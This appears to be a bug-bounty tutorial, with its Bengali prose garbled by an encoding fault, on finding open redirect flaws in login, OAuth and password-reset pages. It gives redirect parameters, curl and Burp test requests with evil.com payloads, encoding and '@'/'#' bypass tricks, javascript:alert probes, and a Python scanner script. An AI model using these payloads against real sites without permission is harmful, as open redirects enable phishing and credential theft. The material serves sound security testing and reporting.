Open Redirect (GET-based Unvalidated Redirects) ‡¶ñ‡ßÅ‡¶Å‡¶ú‡¶§‡ßá ‡¶è‡¶ï‡¶ü‡¶æ ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü‡¶ø‡¶ï ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶™‡ßç‡¶∞‡ßã‡¶ö ‡¶≤‡¶æ‡¶ó‡¶¨‡ßá‡•§ ‡¶è‡¶á bug ‡¶ü‡¶æ ‡¶∏‡¶æ‡¶ß‡¶æ‡¶∞‡¶£‡¶§ login/register/reset password/login with Google/Facebook ‡¶è‡¶∞ ‡¶™‡ßá‡¶á‡¶ú‡¶ó‡ßÅ‡¶≤‡ßã‡¶§‡ßá ‡¶™‡¶æ‡¶ì‡¶Ø‡¶º‡¶æ ‡¶Ø‡¶æ‡¶Ø‡¶º‡•§ ‡¶ß‡¶æ‡¶™‡ßá ‡¶ß‡¶æ‡¶™‡ßá ‡¶¶‡ßá‡¶ñ‡¶ø:

üéØ ‡¶ï‡ßã‡¶•‡¶æ‡¶Ø‡¶º ‡¶ñ‡ßÅ‡¶Å‡¶ú‡¶¨‡ßá (Common Locations)

1. Login pages: /login?redirect=...
2. Register: /register?next=...
3. OAuth callbacks: /auth/callback?redirect_uri=...
4. Password reset: /reset-password?return=...
5. Logout: /logout?redirect=...
6. Profile settings: /profile?return_url=...
7. Common parameters: redirect, redirect_uri, next, return, return_url, dest, url, target
üîç Step-by-Step Detection Process
Step 1: Parameter Discovery (Burp/DevTools)
bash



# Burp Suite Repeater/Intruder ‡¶¶‡¶ø‡¶Ø‡¶º‡ßá
GET /login?redirect=https://evil.com HTTP/1.1
Host: target.com

# ‡¶∏‡¶¨ redirect param test ‡¶ï‡¶∞‡ßã
redirect=//
redirect=http://evil.com
redirect=https://evil.com
redirect=javascript:alert(1)
Step 2: Manual Testing Flow



1. ‡¶∏‡¶æ‡¶ß‡¶æ‡¶∞‡¶£ URL ‡¶¶‡¶æ‡¶ì ‚Üí ‡¶Ø‡ßá‡¶ñ‡¶æ‡¶®‡ßá ‡¶Ø‡¶æ‡¶Ø‡¶º ‡¶¶‡ßá‡¶ñ‡ßã
2. Evil domain ‡¶¶‡¶æ‡¶ì ‚Üí redirect ‡¶π‡¶Ø‡¶º ‡¶ï‡¶ø‡¶®‡¶æ ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡ßã
3. Bypass attempt ‡¶ï‡¶∞‡ßã:
   redirect=//evil.com
   redirect=https://evil.com#target.com/safe
   redirect=http://evil.com@target.com/
Step 3: Burp Suite Workflow



1. Proxy ‚Üí ‡¶∏‡¶¨ traffic capture ‡¶ï‡¶∞‡ßã
2. Target ‚Üí ‡¶∏‡¶æ‡¶á‡¶ü map ‡¶•‡ßá‡¶ï‡ßá ‡¶∏‡¶¨ login/register endpoint ‡¶ñ‡ßÅ‡¶Å‡¶ú‡ßã
3. Engagement Tools ‚Üí Parameter Discovery scan ‡¶ö‡¶æ‡¶≤‡¶æ‡¶ì
4. Repeater ‚Üí ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶æ redirect param test ‡¶ï‡¶∞‡ßã
Step 4: cURL ‡¶¶‡¶ø‡¶Ø‡¶º‡ßá Quick Test
bash



# Basic test
curl -i "https://target.com/login?redirect=https://evil.com"

# Bypass attempts
curl -i "https://target.com/login?redirect=//evil.com"
curl -i "https://target.com/login?redirect=https://evil.com%23target.com/login"
curl -i "https://target.com/login?redirect=javascript:alert(document.domain)"
Step 5: Advanced Bypass Techniques



# URL encoding
redirect=%68%74%74%70%3A%2F%2Fevil.com

# Double encoding  
redirect=%2568%2574%2574%70%253A%252F%252Fevil.com

# Case variations
REDIRECT=evil.com
ReDiReCt=evil.com

# IP instead of domain
redirect=127.0.0.1.xip.io
redirect=192.0.2.42.xip.io
‚úÖ Reproduction Steps (Report ‡¶è‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø)

1. Navigate to: https://target.com/login
2. Append parameter: ?redirect=https://your-burp-collaborator.com
3. Observe redirect to attacker controlled domain
4. Proof: Screenshot + HAR file + Collaborator hit
üõ†Ô∏è Tools Setup


Burp Collaborator ‚Üí External payload generation
- Domain: your-unique-id.oastify.com
- Payload: https://your-unique-id.oastify.com

Browser DevTools ‚Üí Network tab (redirect chain ‡¶¶‡ßá‡¶ñ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø)
‚ö†Ô∏è Impact Demonstration (No Harm)

üöÄ Automation Script (Python)
python
import requests

targets = [
    "/login",
    "/register", 
    "/oauth/callback"
]

payloads = [
    "https://evil.com",
    "//evil.com",
    "javascript:alert(1)"
]

for path in targets:
    for payload in payloads:
        url = f"https://target.com{path}?redirect={payload}"
        resp = requests.get(url, allow_redirects=False, verify=False)
        if resp.status_code in [301,302,307,308]:
            print(f"[+] VULN: {url}")



1. Burp Collaborator hit proof
2. HAR file export (complete request/response chain)
3. Screenshot of redirect confirmation page
4. Phish scenario: "Attackers can phish credentials via login?redirect=evil.com"
